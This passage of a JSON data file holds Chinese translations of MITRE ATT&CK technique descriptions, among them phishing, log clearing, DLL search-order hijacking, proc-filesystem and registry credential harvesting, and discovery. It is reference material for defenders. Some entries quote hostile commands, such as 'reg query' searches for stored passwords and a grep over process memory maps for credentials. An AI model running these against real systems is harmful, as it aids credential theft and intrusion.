IAPP)\n\n对手还可能使用所谓的“浏览器中的浏览器”（BitB）攻击来伪造完整的网站。通过生成一个带有HTML地址栏的假浏览器弹出窗口，看起来包含合法的URL（例如身份验证门户），他们可能能够提示用户输入其凭据，同时绕过典型的URL验证方法。(引用: ZScaler BitB 2020)(引用: Mr. D0x BitB 2022)\n\n对手可以使用网络钓鱼工具包，例如`EvilProxy`和`Evilginx2`，通过代理受害者和合法网站之间的连接来执行中间人网络钓鱼。在成功登录后，受害者被重定向到合法网站，而对手捕获其会话Cookie（即，[窃取Web会话Cookie](https://attack.mitre.org/techniques/T1539)）以及其用户名和密码。这可能使对手能够通过[Web会话Cookie](https://attack.mitre.org/techniques/T1550/004)绕过MFA。(引用: Proofpoint Human Factor)\n\n对手还可能以快速响应（QR）代码（也称为“quishing”）的形式发送恶意链接。这些链接可能会将受害者引导到凭据网络钓鱼页面。(引用: QR-campaign-energy-firm) 通过使用QR码，URL可能不会在电子邮件中暴露，因此可能不会被大多数自动电子邮件安全扫描检测到。(引用: qr-phish-agriculture) 这些QR码可能会被扫描或直接发送到用户的移动设备（即，[网络钓鱼](https://attack.mitre.org/techniques/T1660)），这些设备在几个相关方面可能不太安全。(引用: qr-phish-agriculture) 例如，移动用户可能无法注意到真实和凭据收集网站之间的细微差别，因为移动设备的屏幕较小。\n\n从假网站收集的信息通过Web表单发送给对手。对手还可能使用先前侦察工作的信息（例如，[搜索开放网站/域](https://attack.mitre.org/techniques/T1593)或[搜索受害者拥有的网站](https://attack.mitre.org/techniques/T1594)）来制作有说服力和可信的诱饵。"
    },
    "Clear Linux or Mac System Logs": {
        "translated_name": "清除Linux或Mac系统日志",
        "translated_description": "对手可能会清除系统日志以隐藏入侵的证据。macOS和Linux都通过系统日志跟踪系统或用户发起的操作。大多数本地系统日志记录存储在<code>/var/log/</code>目录下。此目录中的子文件夹按其相关功能分类日志，例如：(引用: Linux Logs)\n\n* <code>/var/log/messages:</code>: 一般和系统相关消息\n* <code>/var/log/secure</code>或<code>/var/log/auth.log</code>: 认证日志\n* <code>/var/log/utmp</code>或<code>/var/log/wtmp</code>: 登录记录\n* <code>/var/log/kern.log</code>: 内核日志\n* <code>/var/log/cron.log</code>: Crond日志\n* <code>/var/log/maillog</code>: 邮件服务器日志\n* <code>/var/log/httpd/</code>: Web服务器访问和错误日志\n"
    },
    "Application or System Exploitation": {
        "translated_name": "应用程序或系统利用",
        "translated_description": "对手可能会利用软件漏洞，导致应用程序或系统崩溃并拒绝用户访问。(引用: Sucuri BIND9 August 2015) 一些系统可能会在崩溃时自动重新启动关键应用程序和服务，但它们可能会被重新利用，导致持续的拒绝服务（DoS）状态。\n\n对手可能会利用已知或零日漏洞来崩溃应用程序和/或系统，这也可能导致依赖的应用程序和/或系统处于DoS状态。崩溃或重新启动的应用程序或系统还可能具有其他影响，例如[数据破坏](https://attack.mitre.org/techniques/T1485)、[固件损坏](https://attack.mitre.org/techniques/T1495)、[服务停止](https://attack.mitre.org/techniques/T1489)等，这可能进一步导致DoS状态并拒绝访问关键信息、应用程序和/或系统。"
    },
    "Office Application Startup": {
        "translated_name": "Office 应用程序启动",
        "translated_description": "对手可能利用基于 Microsoft Office 的应用程序在启动之间保持持久性。Microsoft Office 是企业网络中基于 Windows 操作系统的常见应用程序套件。可以使用多种机制在启动 Office 应用程序时保持持久性；这可能包括使用 Office 模板宏和加载项。\n\n在 Outlook 中发现了多种可以滥用以获得持久性的功能，例如 Outlook 规则、表单和主页。(引用: SensePost Ruler GitHub) 这些持久性机制可以在 Outlook 中工作，也可以通过 Office 365 使用。(引用: TechNet O365 Outlook Rules)"
    },
    "InstallUtil": {
        "translated_name": "InstallUtil",
        "translated_description": "对手可能使用 InstallUtil 通过受信任的 Windows 实用程序代理执行代码。InstallUtil 是一个命令行实用程序，允许通过执行 .NET 二进制文件中指定的特定安装程序组件来安装和卸载资源。(引用: MSDN InstallUtil) InstallUtil 二进制文件也可能由 Microsoft 数字签名，并位于 Windows 系统的 .NET 目录中：<code>C:\\Windows\\Microsoft.NET\\Framework\\v<version>\\InstallUtil.exe</code> 和 <code>C:\\Windows\\Microsoft.NET\\Framework64\\v<version>\\InstallUtil.exe</code>。\n\nInstallUtil 还可以通过使用二进制文件中的属性来绕过应用程序控制，这些属性执行带有 <code>[System.ComponentModel.RunInstaller(true)]</code> 属性的类。(引用: LOLBAS Installutil)"
    },
    "SSH": {
        "translated_name": "SSH",
        "translated_description": "对手可能使用[有效帐户](https://attack.mitre.org/techniques/T1078)通过安全外壳 (SSH) 登录远程计算机，然后以登录用户的身份执行操作。\n\nSSH 是一种允许授权用户在其他计算机上打开远程 shell 的协议。许多 Linux 和 macOS 版本默认安装了 SSH，但通常在用户启用之前是禁用的。SSH 服务器可以配置为使用标准密码身份验证或公钥-私钥对代替或作为密码的补充。在这种身份验证场景中，用户的公钥必须位于运行服务器的计算机上的一个特殊文件中，该文件列出了允许以该用户身份登录的密钥对。"
    },
    "Additional Cloud Roles": {
        "translated_name": "附加云角色",
        "translated_description": "对手可能会向对手控制的云帐户添加附加角色或权限，以保持对租户的持久访问。例如，对手可能会在基于云的环境中更新 IAM 策略，或在 Office 365 环境中添加新的全局管理员。(引用: AWS IAM Policies and Permissions)(引用: Google Cloud IAM Policies)(引用: Microsoft Support O365 Add Another Admin, October 2019)(引用: Microsoft O365 Admin Roles) 具有足够权限的情况下，受损帐户可以获得几乎无限的访问数据和设置的权限（包括重置其他管理员密码的能力）。(引用: Expel AWS Attacker)\n(引用: Microsoft O365 Admin Roles) \n\n此帐户修改可能紧随[创建帐户](https://attack.mitre.org/techniques/T1136)或其他恶意帐户活动之后。对手还可能修改他们已破坏的现有[有效帐户](https://attack.mitre.org/techniques/T1078)。这可能导致权限提升，特别是如果添加的角色允许横向移动到其他帐户。\n\n例如，在 AWS 环境中，具有适当权限的对手可能能够使用 <code>CreatePolicyVersion</code> API 定义 IAM 策略的新版本，或使用 <code>AttachUserPolicy</code> API 将具有附加或不同权限的 IAM 策略附加到受损用户帐户。(引用: Rhino Security Labs AWS Privilege Escalation)\n\n在某些情况下，对手可能会向受害者云租户之外的对手控制的帐户添加角色。这允许这些外部帐户在受害者租户内执行操作，而无需对手[创建帐户](https://attack.mitre.org/techniques/T1136)或修改受害者拥有的帐户。(引用: Invictus IR DangerDev 2024)"
    },
    "Print Processors": {
        "translated_name": "打印处理器",
        "translated_description": "对手可能会滥用打印处理器，在系统启动期间运行恶意 DLL 以实现持久性和/或权限提升。打印处理器是由打印后台处理程序服务 `spoolsv.exe` 在启动期间加载的 DLL。(引用: Microsoft Intro Print Processors)\n\n对手可能通过添加在启动时加载恶意 DLL 的打印处理器来滥用打印后台处理程序服务。可以通过具有 <code>SeLoadDriverPrivilege</code> 权限的帐户使用 <code>AddPrintProcessor</code> API 调用安装打印处理器。或者，可以通过添加指向 DLL 的 <code>HKLM\\SYSTEM\\\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\\\[Windows architecture: e.g., Windows x64]\\Print Processors\\\\[user defined]\\Driver</code> 注册表项将打印处理器注册到打印后台处理程序服务。\n\n为了正确安装恶意打印处理器，有效负载必须位于专用系统打印处理器目录中，可以通过 <code>GetPrintProcessorDirectory</code> API 调用找到该目录，或通过该目录的相对路径引用。(引用: Microsoft AddPrintProcessor May 2018) 安装打印处理器后，必须重新启动打印后台处理程序服务（在启动时启动），以便它们运行。(引用: ESET PipeMon May 2020)\n\n打印后台处理程序服务在 SYSTEM 级别权限下运行，因此由对手安装的打印处理器可能在提升的权限下运行。"
    },
    "Spearphishing Attachment": {
        "translated_name": "鱼叉式网络钓鱼附件",
        "translated_description": "对手可能会发送带有恶意附件的鱼叉式网络钓鱼消息，以获取可在目标过程中使用的敏感信息。鱼叉式网络钓鱼信息试图欺骗目标泄露信息，通常是凭据或其他可操作的信息。鱼叉式网络钓鱼信息通常涉及社会工程技术，例如冒充有理由收集信息的来源（例如：[建立帐户](https://attack.mitre.org/techniques/T1585)或[妥协帐户](https://attack.mitre.org/techniques/T1586)）和/或发送多个看似紧急的消息。\n\n所有形式的鱼叉式网络钓鱼都是针对特定个人、公司或行业的电子社交工程。在这种情况下，对手将文件附加到鱼叉式网络钓鱼电子邮件中，通常依赖于收件人填写信息然后返回文件。(引用: Sophos Attachment)(引用: GitHub Phishery) 鱼叉式网络钓鱼电子邮件的文本通常试图提供一个合理的理由，说明为什么应该填写文件，例如来自业务伙伴的信息请求。对手还可能使用先前侦察工作的信息（例如：[搜索开放网站/域](https://attack.mitre.org/techniques/T1593)或[搜索受害者拥有的网站](https://attack.mitre.org/techniques/T1594)）来制作有说服力和可信的诱饵。"
    },
    "Stripped Payloads": {
        "translated_name": "剥离有效负载",
        "translated_description": "对手可能会尝试通过删除符号、字符串和其他人类可读信息使有效负载难以分析。脚本和可执行文件可能包含变量名称和其他帮助开发人员记录代码功能的字符串。符号通常由操作系统的 `linker` 在编译可执行有效负载时创建。逆向工程师使用这些符号和字符串来分析代码并识别有效负载中的功能。(引用: Mandiant golang stripped binaries explanation)(引用: intezer stripped binaries elf files 2018)\n\n对手可能会使用剥离有效负载以使恶意软件分析更加困难。例如，编译器和其他工具可能提供删除或混淆字符串和符号的功能。对手还使用剥离有效负载格式，例如仅运行 AppleScripts，这是[AppleScript](https://attack.mitre.org/techniques/T1059/002) 的编译和剥离版本，以逃避检测和分析。缺乏人类可读信息可能直接阻碍有效负载的检测和分析。(引用: SentinelLabs reversing run-only applescripts 2021)"
    },
    "Component Object Model": {
        "translated_name": "组件对象模型",
        "translated_description": "对手可能会使用 Windows 组件对象模型 (COM) 进行本地代码执行。COM 是本机 Windows 应用程序编程接口 (API) 的进程间通信 (IPC) 组件，使软件对象之间能够进行交互，或实现一个或多个接口的可执行代码。(引用: Fireeye Hunting COM June 2019) 通过 COM，客户端对象可以调用服务器对象的方法，服务器对象通常是二进制动态链接库 (DLL) 或可执行文件 (EXE)。(引用: Microsoft COM) 远程 COM 执行通过[远程服务](https://attack.mitre.org/techniques/T1021)（如[分布式组件对象模型](https://attack.mitre.org/techniques/T1021/003) (DCOM)）实现。(引用: Fireeye Hunting COM June 2019)\n\n暴露了各种 COM 接口，可以通过多种编程语言（如 C、C++、Java 和[Visual Basic](https://attack.mitre.org/techniques/T1059/005)）滥用以调用任意执行。(引用: Microsoft COM) 还存在特定的 COM 对象，可以直接执行超出代码执行的功能，例如创建[计划任务/作业](https://attack.mitre.org/techniques/T1053)、无文件下载/执行以及与权限提升和持久性相关的其他对手行为。(引用: Fireeye Hunting COM June 2019)(引用: ProjectZero File Write EoP Apr 2018)"
    },
    "DLL Search Order Hijacking": {
        "translated_name": "DLL 搜索顺序劫持",
        "translated_description": "对手可能通过劫持用于加载 DLL 的搜索顺序来执行他们自己的恶意有效负载。Windows 系统使用一种常见的方法来查找要加载到程序中的所需 DLL。(引用: Microsoft Dynamic Link Library Search Order)(引用: FireEye Hijacking July 2010) 劫持 DLL 加载可能是为了建立持久性以及提升权限和/或规避文件执行限制。\n\n对手可以通过多种方式劫持 DLL 加载。对手可能会在目录中植入特洛伊木马动态链接库文件 (DLL)，该目录将在请求的合法库之前被搜索，从而导致 Windows 在调用受害者程序时加载他们的恶意库。对手还可能通过放置与模糊指定的 DLL 同名的恶意 DLL 在 Windows 搜索合法 DLL 之前的位置来执行 DLL 预加载，也称为二进制植入攻击。(引用: OWASP Binary Planting) 通常这个位置是程序的当前工作目录。(引用: FireEye fxsst June 2011) 远程 DLL 预加载攻击发生在程序将其当前目录设置为远程位置（如 Web 共享）之前加载 DLL。(引用: Microsoft Security Advisory 2269637)\n\n幻影 DLL 劫持是一种特定类型的 DLL 搜索顺序劫持，对手针对对不存在的 DLL 文件的引用。(引用: Hexacorn DLL Hijacking)(引用: Adversaries Hijack DLLs) 他们可能能够通过在缺失模块的位置植入具有正确名称的恶意 DLL 来加载自己的恶意 DLL。\n\n对手还可以通过 DLL 重定向直接修改搜索顺序，启用后（在注册表中并创建重定向文件）可能导致程序加载不同的 DLL。(引用: Microsoft Dynamic-Link Library Redirection)(引用: Microsoft Manifests)(引用: FireEye DLL Search Order Hijacking)\n\n如果配置为以更高权限级别运行的程序易受路径劫持攻击，那么加载的对手控制的 DLL 也将以更高权限级别执行。在这种情况下，该技术可用于从用户到管理员或 SYSTEM 的权限提升，或从管理员到 SYSTEM，具体取决于程序。受路径劫持攻击的程序可能会表现正常，因为恶意 DLL 可能会配置为也加载它们原本要替换的合法 DLL。"
    },
    "Automated Collection": {
        "translated_name": "自动化收集",
        "translated_description": "一旦在系统或网络中建立，对手可能会使用自动化技术收集内部数据。执行此技术的方法可能包括使用[命令和脚本解释器](https://attack.mitre.org/techniques/T1059)按特定时间间隔搜索和复制符合设定标准（如文件类型、位置或名称）的信息。\n\n在基于云的环境中，对手还可能使用云API、数据管道、命令行界面或提取、转换和加载（ETL）服务自动收集数据。(引用: Mandiant UNC3944 SMS Phishing 2023)\n\n此功能也可以内置于远程访问工具中。\n\n此技术可能结合使用其他技术，如[文件和目录发现](https://attack.mitre.org/techniques/T1083)和[横向工具传输](https://attack.mitre.org/techniques/T1570)来识别和移动文件，以及[云服务仪表板](https://attack.mitre.org/techniques/T1538)和[云存储对象发现](https://attack.mitre.org/techniques/T1619)来识别云环境中的资源。"
    },
    "Clipboard Data": {
        "translated_name": "剪贴板数据",
        "translated_description": "对手可能会收集用户在应用程序内或应用程序之间复制信息时存储在剪贴板中的数据。\n\n例如，在Windows上，对手可以使用<code>clip.exe</code>或<code>Get-Clipboard</code>访问剪贴板数据。(引用: MSDN Clipboard)(引用: clip_win_server)(引用: CISA_AA21_200B) 此外，对手可能会监视然后替换用户的剪贴板数据（例如，[传输数据操纵](https://attack.mitre.org/techniques/T1565/002)）。(引用: mining_ruby_reversinglabs)\n\nmacOS和Linux也有命令，如<code>pbpaste</code>，可以抓取剪贴板内容。(引用: Operating with EmPyre)"
    },
    "Proc Filesystem": {
        "translated_name": "Proc文件系统",
        "translated_description": "对手可能会从proc文件系统或`/proc`中收集凭据。proc文件系统是一个伪文件系统，用作Linux系统管理虚拟内存的内核数据结构的接口。对于每个进程，`/proc/<PID>/maps`文件显示进程虚拟地址空间内的内存映射方式。而`/proc/<PID>/mem`，用于调试目的，提供对进程虚拟地址空间的访问。(引用: Picus Labs Proc cump 2022)(引用: baeldung Linux proc map 2022)\n\n当以root权限执行时，对手可以搜索系统上所有进程的这些内存位置，以查找包含凭据模式的内容。对手可能会使用正则表达式模式，如<code>grep -E \"^[0-9a-f-]* r\" /proc/\"$pid\"/maps | cut -d' ' -f 1</code>，在内存结构或缓存哈希中查找固定字符串。(引用: atomic-red proc file system) 当没有特权访问时，进程仍然可以查看自己的虚拟内存位置。一些服务或程序可能会在进程内存中以明文保存凭据。(引用: MimiPenguin GitHub May 2017)(引用: Polop Linux PrivEsc Gitbook)\n\n如果以Web浏览器的权限运行，进程可以在`/maps`和`/mem`位置搜索常见的网站凭据模式（也可以用于在同一结构中查找相邻内存），其中可能包含哈希或明文凭据。"
    },
    "Botnet": {
        "translated_name": "僵尸网络",
        "translated_description": "对手可能会妥协大量第三方系统，形成一个僵尸网络，在目标过程中使用。僵尸网络是一个受感染系统的网络，可以被指示执行协调任务。(引用: Norton Botnet) 对手可能会通过妥协大量第三方系统来构建自己的僵尸网络，而不是从booter/stresser服务购买/租用僵尸网络。(引用: Imperva DDoS for Hire) 对手还可能接管现有的僵尸网络，例如将僵尸重定向到对手控制的C2服务器。(引用: Dell Dridex Oct 2015) 拥有僵尸网络后，对手可能会执行后续活动，如大规模[网络钓鱼](https://attack.mitre.org/techniques/T1566)或分布式拒绝服务（DDoS）。"
    },
    "Password Managers": {
        "translated_name": "密码管理器",
        "translated_description": "对手可能会从第三方密码管理器中获取用户凭据。(引用: ise Password Manager February 2019) 密码管理器是用于存储用户凭据的应用程序，通常存储在加密数据库中。用户提供主密码解锁数据库后，通常可以访问这些凭据。这些数据库可以作为文件存储在磁盘上。(引用: ise Password Manager February 2019)\n\n对手可能通过从内存中提取主密码和/或明文凭据来获取密码管理器中的用户凭据。(引用: FoxIT Wocao December 2019)(引用: Github KeeThief) 对手可能通过[凭据访问利用](https://attack.mitre.org/techniques/T1212)从内存中提取凭据。(引用: NVD CVE-2019-3610)\n 对手还可能尝试通过[密码猜测](https://attack.mitre.org/techniques/T1110/001)暴力破解密码管理器的主密码。(引用: Cyberreason Anchor December 2019)"
    },
    "Gatekeeper Bypass": {
        "translated_name": "Gatekeeper绕过",
        "translated_description": "对手可能会修改文件属性并绕过Gatekeeper功能，以逃避用户提示并执行不受信任的程序。Gatekeeper是Apple安全模型的一部分，用于确保仅执行受信任的应用程序。Gatekeeper建立在Snow Leopard（10.6，2009）中的文件隔离之上，并已扩展到包括代码签名、安全策略合规、认证等。Gatekeeper还会对首次运行的应用程序与重新打开的应用程序进行不同处理。(引用: TheEclecticLightCompany Quarantine and the flag)(引用: TheEclecticLightCompany apple notarization)\n\n基于选择加入系统，当文件下载时，执行下载的应用程序可以在文件上设置一个称为`com.apple.quarantine`的扩展属性（也称为隔离标志）。启动服务以挂起状态打开应用程序。对于首次运行且设置了隔离标志的应用程序，Gatekeeper执行以下功能：\n\n1. 检查扩展属性 - Gatekeeper检查隔离标志，然后向用户提供允许或拒绝执行的提示。(引用: OceanLotus for OS X)(引用: 20 macOS Common Tools and Techniques)\n\n2. 检查系统策略 - Gatekeeper检查系统安全策略，允许执行从App Store或App Store和已识别开发者下载的应用程序。\n\n3. 代码签名 - Gatekeeper检查Apple开发者ID的有效代码签名。\n\n4. 认证 - 使用`api.apple-cloudkit.com` API，Gatekeeper连接到Apple服务器验证或下载认证票据，并确保票据未被撤销。用户可以覆盖认证，这将导致执行“未经授权的应用程序”的提示，并修改安全策略。\n\n对手可以通过逻辑错误（例如[防御规避利用](https://attack.mitre.org/techniques/T1211)）、未检查的文件类型和外部库绕过Gatekeeper检查中的一个或多个安全控制。例如，在macOS 13 Ventura之前，代码签名和认证检查仅在首次启动时进行，允许对手将恶意可执行文件写入先前打开的应用程序，以绕过Gatekeeper安全检查。(引用: theevilbit gatekeeper bypass 2021)(引用: Application Bundle Manipulation Brandon Dalton)\n\n从USB闪存驱动器、光盘、外部硬盘驱动器、通过本地网络共享的驱动器或使用curl命令加载到系统上的应用程序和文件可能不会设置隔离标志。此外，可以通过[驱动器式攻击](https://attack.mitre.org/techniques/T1189)避免设置隔离标志。"
    },
    "Drive-by Target": {
        "translated_name": "驱动目标",
        "translated_description": "对手可能会准备一个操作环境，以感染在正常浏览过程中访问网站的系统。通过浏览到对手控制的网站，端点系统可能会被妥协，如在[驱动器式攻击](https://attack.mitre.org/techniques/T1189)中。在这种情况下，通常会针对用户的Web浏览器进行利用（通常在登陆网站后不需要额外的用户交互），但对手也可能设置网站进行非利用行为，如[应用程序访问令牌](https://attack.mitre.org/techniques/T1550/001)。在[驱动器式攻击](https://attack.mitre.org/techniques/T1189)之前，对手必须准备资源，以便向浏览到对手控制网站的用户提供利用。驱动器内容可以在对手控制的基础设施上准备，这些基础设施已被获取（[获取基础设施](https://attack.mitre.org/techniques/T1583)）或先前被妥协（[妥协基础设施](https://attack.mitre.org/techniques/T1584)）。\n\n对手可能会上传或注入恶意Web内容，如[JavaScript](https://attack.mitre.org/techniques/T1059/007)，到网站中。(引用: FireEye CFR Watering Hole 2012)(引用: Gallagher 2015) 这可以通过多种方式完成，包括：\n\n* 将恶意脚本插入网页或其他用户可控的Web内容，如论坛帖子\n* 修改从公共可写云存储桶提供给网站的脚本文件\n* 制作恶意Web广告并通过合法广告提供商购买网站上的广告空间（即，[恶意广告](https://attack.mitre.org/techniques/T1583/008)）\n\n除了准备内容以利用用户的Web浏览器外，对手还可能准备脚本内容以分析用户的浏览器（如在[收集受害者主机信息](https://attack.mitre.org/techniques/T1592)中），以确保其在尝试利用之前是易受攻击的。(引用: ATT ScanBox)\n\n被对手妥协并用于准备驱动器的网页可能是特定社区访问的网页，如政府、特定行业或地区，目标是基于共同兴趣妥协特定用户或用户集。这种类型的目标活动称为战略性Web妥协或水坑攻击。\n\n对手可能会在获取基础设施（[域](https://attack.mitre.org/techniques/T1583/001)）期间购买类似于合法域的域（例如：同形异义字、拼写错误、不同顶级域等），以帮助促进[驱动器式攻击](https://attack.mitre.org/techniques/T1189)。"
    },
    "System Service Discovery": {
        "translated_name": "系统服务发现",
        "translated_description": "对手可能会尝试收集有关注册的本地系统服务的信息。对手可能会使用工具以及操作系统实用程序命令（如<code>sc query</code>、<code>tasklist /svc</code>、<code>systemctl --type=service</code>和<code>net start</code>）获取有关服务的信息。\n\n对手可能会使用[系统服务发现](https://attack.mitre.org/techniques/T1007)中的信息进行自动化发现，以塑造后续行为，包括对手是否完全感染目标和/或尝试特定操作。"
    },
    "Network Sniffing": {
        "translated_name": "网络嗅探",
        "translated_description": "对手可能会被动嗅探网络流量，以捕获有关环境的信息，包括通过网络传输的认证材料。网络嗅探是指使用系统上的网络接口监视或捕获通过有线或无线连接发送的信息。对手可能会将网络接口置于混杂模式，以被动访问网络上的数据，或使用镜像端口捕获大量数据。\n\n通过此技术捕获的数据可能包括用户凭据，特别是通过不安全、未加密协议发送的凭据。名称服务解析中毒技术，如[LLMNR/NBT-NS中毒和SMB中继](https://attack.mitre.org/techniques/T1557/001)，也可以用于捕获网站、代理和内部系统的凭据，通过将流量重定向到对手。\n\n网络嗅探可能会揭示配置细节，如运行的服务、版本号和其他网络特征（例如IP地址、主机名、VLAN ID），这些信息对于后续[横向移动](https://attack.mitre.org/tactics/TA0008)和/或[防御规避](https://attack.mitre.org/tactics/TA0005)活动是必要的。对手可能还会在[中间人攻击](https://attack.mitre.org/techniques/T1557)（AiTM）期间利用网络嗅探被动获取有关环境的更多知识。\n\n在基于云的环境中，对手仍然可以使用流量镜像服务嗅探虚拟机的网络流量。例如，AWS流量镜像、GCP数据包镜像和Azure vTap允许用户定义指定的实例以收集流量，并将收集的流量发送到指定的目标。(引用: AWS Traffic Mirroring)(引用: GCP Packet Mirroring)(引用: Azure Virtual Network TAP) 通常，由于在负载均衡器级别使用TLS终止以减少加密和解密流量的负担，大部分流量将是明文的。(引用: Rhino Security Labs AWS VPC Traffic Mirroring)(引用: SpecterOps AWS Traffic Mirroring) 对手然后可以使用数据传输到云账户等外传技术访问嗅探到的流量。(引用: Rhino Security Labs AWS VPC Traffic Mirroring)\n\n在网络设备上，对手可能会使用[网络设备CLI](https://attack.mitre.org/techniques/T1059/008)命令（如`monitor capture`）执行网络捕获。(引用: US-CERT-TA18-106A)(引用: capture_embedded_packet_on_software)"
    },
    "Code Signing": {
        "translated_name": "代码签名",
        "translated_description": "对手可能会创建、获取或窃取代码签名材料来签署他们的恶意软件或工具。代码签名为开发者提供了一定程度的真实性，并保证二进制文件未被篡改。(引用: Wikipedia Code Signing) 操作期间使用的证书可能由对手创建、获取或窃取。(引用: Securelist Digital Certificates)(引用: Symantec Digital Certificates) 与[无效代码签名](https://attack.mitre.org/techniques/T1036/001)不同，此活动将导致有效签名。\n\n在现代Windows和macOS系统上，代码签名可用于验证软件的首次运行。由于平台的去中心化性质，它不用于Linux。(引用: Wikipedia Code Signing)(引用: EclecticLightChecksonEXECodeSigning)\n\n代码签名证书可用于绕过要求签名代码才能在系统上执行的安全策略。"
    },
    "Data from Cloud Storage": {
        "translated_name": "来自云存储的数据",
        "translated_description": "对手可能会访问云存储中的数据。\n\n许多IaaS提供商提供在线数据对象存储解决方案，如Amazon S3、Azure Storage和Google Cloud Storage。同样，SaaS企业平台如Office 365和Google Workspace通过OneDrive和Google Drive等服务为用户提供基于云的文档存储，而SaaS应用程序提供商如Slack、Confluence、Salesforce和Dropbox可能提供云存储解决方案作为其平台的外围或主要用例。\n\n在某些情况下，如基于IaaS的云存储，没有与存储对象交互的总体应用程序（如SQL或Elasticsearch）：相反，这些解决方案中的数据是通过[云API](https://attack.mitre.org/techniques/T1059/009)直接检索的。在SaaS应用程序中，对手可能能够直接从API或后端云存储对象中收集这些数据，而不是通过其前端应用程序或界面（即，[来自信息库的数据](https://attack.mitre.org/techniques/T1213)）。\n\n对手可能会从这些云存储解决方案中收集敏感数据。提供商通常提供安全指南以帮助最终用户配置系统，但配置错误是一个常见问题。(引用: Amazon S3 Security, 2019)(引用: Microsoft Azure Storage Security, 2019)(引用: Google Cloud Storage Best Practices, 2019) 已经发生了许多事件，其中云存储未正确保护，通常是通过无意中允许未经身份验证的用户公开访问、所有用户的过度访问，甚至是任何匿名人员在不需要基本用户权限的情况下访问。\n\n这种开放访问可能会暴露各种类型的敏感数据，如信用卡、个人身份信息或医疗记录。(引用: Trend Micro S3 Exposed PII, 2017)(引用: Wired Magecart S3 Buckets, 2019)(引用: HIPAA Journal S3 Breach, 2017)(引用: Rclone-mega-extortion_05_2021)\n\n对手还可能获取并滥用从源代码库、日志或其他方式泄露的凭据，以访问云存储对象。"
    },
    "Runtime Data Manipulation": {
        "translated_name": "运行时数据操纵",
        "translated_description": "对手可能会修改系统以在访问和显示给最终用户时操纵数据，从而威胁数据的完整性。(引用: FireEye APT38 Oct 2018)(引用: DOJ Lazarus Sony 2018) 通过操纵运行时数据，对手可能试图影响业务流程、组织理解和决策。\n\n对手可能会更改用于显示数据的应用程序二进制文件，以导致运行时操纵。对手还可能进行[更改默认文件关联](https://attack.mitre.org/techniques/T1546/001)和[伪装](https://attack.mitre.org/techniques/T1036)以产生类似效果。修改的类型及其影响取决于目标应用程序和过程以及对手的目标和目的。对于复杂系统，对手可能需要特殊的专业知识，并可能需要访问与系统相关的专用软件，这通常通过长期的信息收集活动获得，以实现预期的影响。"
    },
    "Credentials in Registry": {
        "translated_name": "注册表中的凭据",
        "translated_description": "对手可能会在被破坏的系统上搜索注册表中不安全存储的凭据。Windows注册表存储配置信息，系统或其他程序可以使用这些信息。对手可能会查询注册表，寻找其他程序或服务存储的凭据和密码。有时这些凭据用于自动登录。\n\n查找与密码信息相关的注册表项的示例命令：(引用: Pentestlab Stored Credentials)\n\n* 本地机器配置单元：<code>reg query HKLM /f password /t REG_SZ /s</code>\n* 当前用户配置单元：<code>reg query HKCU /f password /t REG_SZ /s</code>"
    },
    "Network Share Discovery": {
        "translated_name": "网络共享发现",
        "translated_description": "对手可能会查找远程系统上共享的文件夹和驱动器，以识别信息来源作为收集的前提，并识别潜在的感兴趣系统以进行横向移动。网络通常包含共享网络驱动器和文件夹，使用户能够访问网络上各种系统的文件目录。\n\n通过Windows网络进行文件共享使用SMB协议。(引用: Wikipedia Shared Resource)(引用: TechNet Shared Folder) [Net](https://attack.mitre.org/software/S0039)可以用来查询远程系统上的可用共享驱动器，使用<code>net view \\\\\\\\remotesystem</code>命令。它也可以用来查询本地系统上的共享驱动器，使用<code>net share</code>。对于macOS，<code>sharing -l</code>命令列出用于smb服务的所有共享点。"
    },
    "Peripheral Device Discovery": {
        "translated_name": "外围设备发现",
        "translated_description": "对手可能会尝试收集有关连接到计算机系统的外围设备和组件的信息。(引用: Peripheral Discovery Linux)(引用: Peripheral Discovery macOS) 外围设备可能包括支持各种功能的辅助资源，如键盘、打印机、摄像头、智能卡读卡器或可移动存储。此信息可能用于增强他们对系统和网络环境的了解，或用于进一步的操作。"
    },
    "Break Process Trees": {
        "translated_name": "打破进程树",
        "translated_description": "对手可能会尝试通过修改执行的恶意软件的父进程ID（PPID）来规避基于进程树的分析。如果端点保护软件利用“父子”关系进行检测，打破这种关系可能导致对手的行为不与先前的进程树活动相关联。在基于Unix的系统上，打破此进程树是管理员使用脚本和程序执行软件的常见做法。(引用: 3OHA double-fork 2022)\n\n在Linux系统上，对手可能会执行一系列[本机API](https://attack.mitre.org/techniques/T1106)调用来更改恶意软件的进程树。例如，对手可以在没有任何参数的情况下执行其有效负载，调用`fork()` API调用两次，然后让父进程退出。这会创建一个没有父进程的孙进程，该进程立即被`init`系统进程（PID 1）收养，从而成功断开对手有效负载的执行与其先前的进程树的连接。\n\n另一个示例是使用“daemon”系统调用从当前父进程分离并在后台运行。(引用: Sandfly BPFDoor 2022)(引用: Microsoft XorDdos Linux Stealth 2022)"
    },
    "Network Topology": {
        "translated_name": "网络拓扑",
        "translated_description": "对手可能会收集有关受害者网络拓扑的信息，以在目标过程中使用。网络拓扑信息可能包括各种详细信息，包括外部和内部网络环境的物理和/或逻辑安排。这些信息还可能包括有关网络设备（网关、路由器等）和其他基础设施的具体信息。\n\n对手可能通过多种方式收集这些信息，例如通过[主动扫描](https://attack.mitre.org/techniques/T1595)或[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)进行直接收集操作。有关网络拓扑的信息也可能通过在线或其他可访问的数据集暴露给对手（例如，[搜索受害者拥有的网站](https://attack.mitre.org/techniques/T1594)）。(引用: DNS Dumpster) 收集这些信息可能会揭示其他形式的侦察机会（例如，[搜索开放技术数据库](https://attack.mitre.org/techniques/T1596)或[搜索开放网站/域](https://attack.mitre.org/techniques/T1593)），建立操作资源（例如，[获取基础设施](https://attack.mitre.org/techniques/T1583)或[妥协基础设施](https://attack.mitre.org/techniques/T1584)），和/或初始访问（例如，[外部远程服务](https://attack.mitre.org/techniques/T1133)）。"
    },
    "Code Signing Certificates": {
        "translated_name": "代码签名证书",
